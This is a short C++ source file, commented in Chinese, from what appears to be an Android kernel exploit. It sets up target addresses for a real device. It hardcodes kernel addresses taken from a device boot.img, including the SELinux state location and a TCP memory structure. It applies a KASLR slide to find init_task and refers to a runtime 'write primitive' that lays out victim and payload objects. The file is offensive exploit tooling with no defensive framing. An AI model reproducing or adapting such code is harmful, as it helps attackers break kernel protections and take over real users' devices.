#include "const.h"
#include "tools.h"
#include "selinux/const.h"
static Print print("init_addrs");
void pad_addr() {
    // 与 out-qemu 不同、按 extract/vmlinux (提取自真机boot.img) 实测覆盖：
    LINK_BSS_STOP       = 0xffffff800c3b6000UL;
    LINK_BSS_START      = 0xffffff800b74f800UL;
    LINK_LOCK_START           = LINK_BSS_STOP - 0x800;
    LINK_TCPMEM_DATA    = 0xffffff800b6e0890UL;
    LINK_SELINUX_STATE = LINK_BSS_STOP - 0x1000;
    STORE_PATH = "/data/local/tmp/erblk";
    print("已载入真机boot.img地址");
}

void init_addrs() {
    //改成真机地址
    if (getenv("PAD")) {
        print("PAD=1 载入真机地址");
        pad_addr();
    }
    //选槽
    if (auto sl = getenv("SLOT")) {
        SLOT = std::stoul(sl);
    }
    else print("没有给定槽号，默认0号");

    //VICTIM PAYLOAD LOCK WAITER及其布局由写原语方法运行时设置
    INIT_TASK = LINK_INIT_TASK + kaslr_slide;    // &init_task

    static_assert(std::atomic<int>::is_always_lock_free);
    static_assert(std::atomic<bool>::is_always_lock_free);
    static_assert(std::atomic<unsigned long>::is_always_lock_free);
}